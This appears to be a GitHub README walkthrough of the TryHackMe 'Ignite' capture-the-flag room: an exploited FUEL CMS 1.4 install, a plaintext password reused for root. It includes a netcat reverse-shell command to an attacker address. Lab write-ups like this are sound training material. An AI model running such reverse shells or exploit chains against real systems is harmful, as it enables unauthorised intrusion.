# Ignite CTF - TryHackMe Room
# **!! SPOILERS !!**
#### This repository documents my walkthrough for the **Ignite** CTF challenge on [TryHackMe](https://tryhackme.com/room/ignite). 
---

from scan we know about web page on port 80

![scn](imgs/scn.png "scn")

we see partialy configured FUEL CMS 1.4 we also see admin credentials

![cms](imgs/cms.png "cms")

![creds](imgs/creds.png "creds")

for this version there is an exploit from exploit-db that should work

![db](imgs/db.png "db")

i found working version of the script

now we have Remote Code Execution

![cmd](imgs/cmd.png "cmd")

i used this command to get better rev shell

```
busybox nc 10.14.X.X 4445 -e /bin/bash
```

we found user flag

![user](imgs/user.png "user")

using linpeas i only found some plain text password and decided to try to use it as root password

![lin](imgs/lin.png "lin")

it worked we have root access and root flag

![root](imgs/root.png "root")

# MACHINE PWNED
